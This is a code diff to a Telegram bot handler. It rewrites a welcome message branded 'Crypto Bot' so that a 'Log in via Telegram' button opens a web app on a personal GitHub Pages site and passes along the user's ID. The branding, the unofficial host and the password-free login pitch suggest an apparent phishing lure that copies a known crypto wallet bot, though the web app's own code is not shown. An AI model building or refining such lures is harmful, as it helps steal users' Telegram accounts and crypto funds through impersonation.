@@ -700,13 +700,14 @@ async def cmd_testreg(msg: Message, state: FSMContext):
         
         bot_me = await msg.bot.get_me()
         bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
-        webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&bot={bot_username}&v={int(time.time())}"
+        webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?tab=wallet&uid={msg.from_user.id}&t={int(time.time())}"
         text = (
             '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
-            "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
+            "Кошелёк готов к работе. Войдите через Telegram для мгновенного доступа ко всем возможностям без ввода паролей."
         )
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Начать", web_app=WebAppInfo(url=webapp_reg_url))]
+            [InlineKeyboardButton(text="Войти через Telegram", web_app=WebAppInfo(url=webapp_url))],
+            [InlineKeyboardButton(text="Начать в боте", callback_data="onb:quick_start")]
         ])
         img_path = os.path.join(BASE_DIR, "welcome.jpg")
         if os.path.exists(img_path):
